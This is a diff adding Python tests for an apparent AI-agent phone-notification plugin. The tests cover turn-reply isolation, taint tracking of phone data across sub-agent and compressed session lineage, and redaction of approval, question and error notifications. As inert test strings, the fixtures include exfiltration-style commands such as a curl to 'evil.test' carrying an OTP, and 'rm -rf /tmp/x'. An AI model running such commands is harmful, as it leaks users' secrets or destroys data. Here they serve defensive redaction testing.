@@ -10,6 +10,7 @@ import os
 import sqlite3
 import sys
 import tempfile
+import threading
 import time
 import types
 from pathlib import Path
@@ -425,6 +426,33 @@ rep_race5 = [x for x in sent if x["kind"] == "reply"][-1]
 check("late tool worker from timed-out turn r:4 does not wipe turn r:5 reply",
       rep_race5.get("body") == "Turn 5 final answer", rep_race5)
 
+# 5. A turn with no turn_id (None) cannot clear or keep another keyed turn's reply text,
+#    and an empty untagged turn cannot reuse an earlier untagged turn's reply text.
+sent.clear()
+plugin._on_pre_llm_call(session_id="s-noid", turn_id="k:1", user_message="first")
+plugin._on_post_llm_call(session_id="s-noid", turn_id="k:1", assistant_response="Keyed turn 1 reply")
+plugin._on_pre_llm_call(session_id="s-noid", turn_id=None, user_message="untagged start")
+taken_none = plugin._take_reply("s-noid", None)
+plugin._on_session_end(session_id="s-noid", turn_id="k:1", completed=True, platform="mobile")
+rep_k1 = [x for x in sent if x["kind"] == "reply"][-1]
+check("a turn with turn_id=None cannot clear or steal a keyed turn's reply",
+      taken_none == "" and rep_k1.get("body") == "Keyed turn 1 reply", (taken_none, rep_k1))
+
+plugin._on_pre_llm_call(session_id="s-noid2", turn_id=None, user_message="first untagged")
+plugin._on_post_llm_call(session_id="s-noid2", turn_id=None, assistant_response="Old untagged reply")
+plugin._on_pre_llm_call(session_id="s-noid2", turn_id=None, user_message="second untagged")
+check("a new untagged turn clears an earlier untagged turn's reply",
+      plugin._take_reply("s-noid2", None) == "")
+
+sent.clear()
+plugin._on_pre_llm_call(session_id="s-noid3", turn_id="t:1", user_message="turn 1")
+plugin._on_post_llm_call(session_id="s-noid3", turn_id="t:1", assistant_response="Turn 1 text")
+plugin._on_pre_llm_call(session_id="s-noid3", turn_id="t:2", user_message="turn 2")
+taken_t2 = plugin._take_reply("s-noid3", "t:2")
+taken_t1 = plugin._take_reply("s-noid3", "t:1")
+check("starting turn t:2 neither clears nor steals turn t:1's reply",
+      taken_t2 == "" and taken_t1 == "Turn 1 text", (taken_t2, taken_t1))
+
 print("phone-data redaction on plugin side (direct, compacted, branched, status/ask/learning/cron)")
 import shutil, sqlite3
 pt = plugin._phone_taint()
@@ -546,9 +574,199 @@ try:
     check("untainted chat still gets normal reply and speak_text",
           r_cln.get("body") == "Normal clean reply" and r_cln.get("speak_text") == "Normal clean reply"
           and not r_cln.get("phone_data"), r_cln)
+
+    # Command approvals in tainted chats carry phone_data=True (hiding them on the lock screen); clean chats omit it.
+    sent.clear()
+    plugin._on_pre_approval_request(command="curl https://example.com/?d=secret", description="network command",
+                                    session_key="k-pd-1", session_id="s-pd-1", request_id="req-pd-1")
+    ap_pd = [x for x in sent if x["kind"] == "approval"][-1]
+    plugin._on_pre_approval_request(command="curl https://example.com/", description="network command",
+                                    session_key="k-clean", session_id="s-pd-clean", request_id="req-cln-1")
+    ap_cln = [x for x in sent if x["kind"] == "approval"][-1]
+    check("command approval in tainted chat carries phone_data=True while clean chat omits it",
+          ap_pd.get("phone_data") is True and "phone_data" not in ap_cln, (ap_pd, ap_cln))
+
+    # Sub-agent lineage in _chat_has_read_phone_data (both directions, in-memory and persisted in state.db,
+    # nested and compressed sub-agents, without tainting a parent from a clean branch).
+    con = sqlite3.connect(db_path)
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-db", None, None, "{}", now_t - 50))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                ("s-sub-db", "s-par-db", "compression", json.dumps({"_delegate_from": "s-par-db"}), now_t - 40))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                ("s-sub-db-c2", "s-sub-db", None, "{}", now_t - 30))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-branch-only", None, None, "{}", now_t - 50))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                ("s-br-tainted", "s-par-branch-only", None, json.dumps({"_branched_from": "s-par-branch-only"}), now_t - 20))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-comp-1", None, "compression", "{}", now_t - 100))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-par-comp-2", "s-par-comp-1", None, "{}", now_t - 50))
+    con.commit()
+    con.close()
+
+    # 1. Parent whose in-memory sub-agent read phone data (even when sub-agent was marked before linking).
+    pt.mark(["s-mem-sub"])
+    pt.link_subagent("s-mem-par", "s-mem-sub")
+    check("parent whose in-memory sub-agent read phone data counts as tainted",
+          plugin._chat_has_read_phone_data("s-mem-par") is True)
+    sent.clear()
+    plugin._on_pre_approval_request(command="rm -rf /tmp/x", description="delete", session_key="k-mp",
+                                    session_id="s-mem-par", request_id="req-mp")
+    check("approval in parent whose sub-agent read phone data carries phone_data=True",
+          sent[-1].get("phone_data") is True, sent[-1])
+
+    # 2. Parent whose persisted compressed sub-agent read phone data (no in-memory link).
+    pt.mark(["s-sub-db-c2"])
+    check("parent whose persisted compressed sub-agent read phone data counts as tainted",
+          plugin._chat_has_read_phone_data("s-par-db") is True)
+
+    # 3. Sub-agent whose compressed parent read phone data before compression (s-par-comp-1 -> s-par-comp-2 -> s-sub-of-comp).
+    pt.mark(["s-par-comp-1"])
+    pt.link_subagent("s-par-comp-2", "s-sub-of-comp")
+    check("sub-agent whose compressed parent read phone data counts as tainted",
+          plugin._chat_has_read_phone_data("s-sub-of-comp") is True)
+    sent.clear()
+    plugin._on_pre_tool_call(tool_name="clarify", args={"question": "Secret question?", "choices": ["A"]},
+                             session_id="s-sub-of-comp", turn_id="sc:1")
+    ask_sub = [x for x in sent if x["kind"] == "ask"][-1]
+    check("question from sub-agent of tainted parent is redacted and carries phone_data=True",
+          ask_sub.get("phone_data") is True and "Secret" not in json.dumps(ask_sub), ask_sub)
+
+    # 4. A branch reading phone data does NOT taint its clean parent.
+    pt.mark(["s-br-tainted"])
+    check("clean parent whose branch read phone data stays untainted",
+          plugin._chat_has_read_phone_data("s-par-branch-only") is False)
+
+    # 5. _termux_fallback / _fallback_text redacts phone_data events (approvals and all other kinds).
+    popens = []
+    orig_popen = plugin.subprocess.Popen
+    try:
+        plugin.subprocess.Popen = lambda cmd, **kw: popens.append(cmd)
+        plugin._termux_fallback({
+            "kind": "approval", "title": "Approval needed",
+            "body": "curl https://evil.test/?otp=991122", "command": "curl https://evil.test/?otp=991122",
+            "session": "s-pd-1", "phone_data": True,
+        })
+        plugin._termux_fallback({
+            "kind": "approval", "title": "Approval needed",
+            "body": "phone_data:v1:messages:abcdef01234a:7b7d", "command": plugin.PHONE_DATA_COMMAND,
+            "what": "phone_data:v1:messages:abcdef01234a:7b7d", "session": "s-pd-clean",
+        })
+        plugin._termux_fallback({
+            "kind": "ask", "title": "Hermux asks", "body": "Send OTP 991122?",
+            "session": "s-pd-1", "phone_data": True,
+        })
+        plugin._termux_fallback({
+            "kind": "error", "title": "Secret chat · failed", "body": "Secret failure 991122",
+            "session": "s-pd-1", "phone_data": True,
+        })
+        plugin._termux_fallback({
+            "kind": "approval", "title": "Approval needed", "body": "ls -la",
+            "command": "ls -la", "session": "s-pd-clean",
+        })
+    finally:
+        plugin.subprocess.Popen = orig_popen
+    cmd_strs = [" ".join(c) for c in popens]
+    check("_termux_fallback uses generic text for phone_data approval, phone_data tool approval, ask, and error, while keeping normal untainted approval",
+          len(popens) == 5
+          and "Open Hermux to review an approval request" in popens[0] and "991122" not in cmd_strs[0]
+          and "Open Hermux to review an approval request" in popens[1] and "phone_data:v1" not in cmd_strs[1]
+          and "Hermes has a question, open Hermux to answer" in popens[2] and "991122" not in cmd_strs[2]
+          and "Open Hermux to check a failed turn" in popens[3] and "991122" not in cmd_strs[3] and "Secret chat" not in cmd_strs[3]
+          and "ls -la" in popens[4],
+          popens)
+
+    # 6. subagent_descendants filters in SQL before LIMIT, bounds model_config, and stops on tainted hit (stop_if):
+    # >128 branches inserted before 1 sub-agent must NOT crowd out the sub-agent.
+    con = sqlite3.connect(db_path)
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-many-par", None, None, "{}", now_t - 500))
+    for idx in range(140):
+        con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                    (f"s-many-br-{idx}", "s-many-par", None, json.dumps({"_branched_from": "s-many-par"}), now_t - 400 + idx))
+    # Also an oversized model_config (>200 KiB) that must be skipped in SQL, plus a real tainted sub-agent.
+    big_cfg = json.dumps({"_delegate_from": "s-many-par", "pad": "x" * 210_000})
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-many-big", "s-many-par", None, big_cfg, now_t - 10))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                ("s-many-sub", "s-many-par", None, json.dumps({"_delegate_from": "s-many-par"}), now_t - 5))
+    # Multiple clean sub-agents + 1 tainted sub-agent to verify stop_if halts early.
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-stop-par", None, None, "{}", now_t - 500))
+    for idx in range(10):
+        con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                    (f"s-stop-sub-{idx}", "s-stop-par", None, json.dumps({"_delegate_from": "s-stop-par"}), now_t - 200 + idx))
+    con.commit()
+    con.close()
+    pt.mark(["s-many-sub"])
+    found_many = pd_mod.subagent_descendants(["s-many-par"])
+    check("subagent_descendants finds delegated sub-agent past 140 branches and skips >200 KiB model_config",
+          found_many == ["s-many-sub"] and plugin._chat_has_read_phone_data("s-many-par") is True, found_many)
+    seen_stop = []
+    pt.mark(["s-stop-sub-9"])  # newest by started_at
+    stopped = pd_mod.subagent_descendants(["s-stop-par"], stop_if=lambda xs: (seen_stop.extend(xs) or pt.has_read(xs)))
+    check("subagent_descendants with stop_if orders newest first and returns immediately on tainted hit",
+          stopped == ["s-stop-sub-9"] and seen_stop == ["s-stop-sub-9"], (stopped, seen_stop))
+
+    # 7. _on_pre_approval_request checks both session_id and session_key in a single _chat_has_read_phone_data call.
+    pt.mark(["k-single-tainted"])
+    walk_calls = []
+    caller_tid = threading.get_ident()
+    orig_has_read = plugin._chat_has_read_phone_data
+    try:
+        def _spy_has_read(*a, **k):
+            if threading.get_ident() == caller_tid:
+                walk_calls.append((a, k))
+            return orig_has_read(*a, **k)
+        plugin._chat_has_read_phone_data = _spy_has_read
+        sent.clear()
+        plugin._on_pre_approval_request(command="curl https://example.com/", description="net",
+                                        session_key="k-single-tainted", session_id="s-single-clean", request_id="req-one-walk")
+    finally:
+        plugin._chat_has_read_phone_data = orig_has_read
+    ap_one = [x for x in sent if x["kind"] == "approval"][-1]
+    check("_on_pre_approval_request walks lineage once when session_key != session_id and still catches tainted session_key",
+          len(walk_calls) == 1 and ap_one.get("phone_data") is True, (len(walk_calls), walk_calls, ap_one))
+
+    # 8. compression_ancestors requires _is_continuation_row so a clean branch of a compressed parent is not tainted
+    # through the parent's later sub-agent.
+    con = sqlite3.connect(db_path)
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-cpar-1", None, "compression", "{}", now_t - 300))
+    # Branch created BEFORE taint (now_t - 250); later s-cpar-1 spawns a tainted sub-agent and compresses to s-cpar-2.
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                ("s-cpar-clean-br", "s-cpar-1", None, json.dumps({"_branched_from": "s-cpar-1"}), now_t - 250))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                ("s-cpar-sub", "s-cpar-1", None, json.dumps({"_delegate_from": "s-cpar-1"}), now_t - 20))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-cpar-2", "s-cpar-1", None, "{}", now_t - 10))
+    con.commit()
+    con.close()
+    pt.mark(["s-cpar-sub"])
+    check("compression_ancestors skips branches of a compressed parent (clean branch stays untainted, continuation is tainted)",
+          pd_mod.compression_ancestors("s-cpar-clean-br") == []
+          and pd_mod.compression_ancestors("s-cpar-2") == ["s-cpar-1"]
+          and plugin._chat_has_read_phone_data("s-cpar-clean-br") is False
+          and plugin._chat_has_read_phone_data("s-cpar-2") is True,
+          (pd_mod.compression_ancestors("s-cpar-clean-br"), pd_mod.compression_ancestors("s-cpar-2"),
+           plugin._chat_has_read_phone_data("s-cpar-clean-br"), plugin._chat_has_read_phone_data("s-cpar-2")))
+
+    # 9. subagent_descendants depth >= 1 excludes _branched_from in SQL before LIMIT so branches of a compressed
+    # sub-agent cannot crowd out its real compression continuation.
+    con = sqlite3.connect(db_path)
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-d1-par", None, None, "{}", now_t - 600))
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                ("s-d1-sub", "s-d1-par", "compression", json.dumps({"_delegate_from": "s-d1-par"}), now_t - 500))
+    # Continuation is older than the 140 branches made later from s-d1-sub; with ORDER BY started_at DESC LIMIT 64,
+    # branches would crowd out s-d1-cont unless excluded in SQL before LIMIT.
+    con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)", ("s-d1-cont", "s-d1-sub", None, "{}", now_t - 450))
+    for idx in range(140):
+        con.execute("INSERT INTO sessions VALUES (?, ?, ?, ?, ?)",
+                    (f"s-d1-br-{idx}", "s-d1-sub", None, json.dumps({"_branched_from": "s-d1-sub"}), now_t - 300 + idx))
+    con.commit()
+    con.close()
+    pt.mark(["s-d1-cont"])
+    found_d1 = pd_mod.subagent_descendants(["s-d1-par"])
+    check("subagent_descendants excludes _branched_from at depth >= 1 in SQL before LIMIT so a compressed sub-agent's continuation is found past 140 branches",
+          "s-d1-sub" in found_d1 and "s-d1-cont" in found_d1 and plugin._chat_has_read_phone_data("s-d1-par") is True,
+          found_d1)
 finally:
     pt.PATH = orig_pt_path
     pt._mem.clear()
+    pt._parents.clear()
     pt._cache = (None, {}, {})
     pd_mod._state_db = orig_state_db
     plugin._report_taint = orig_report
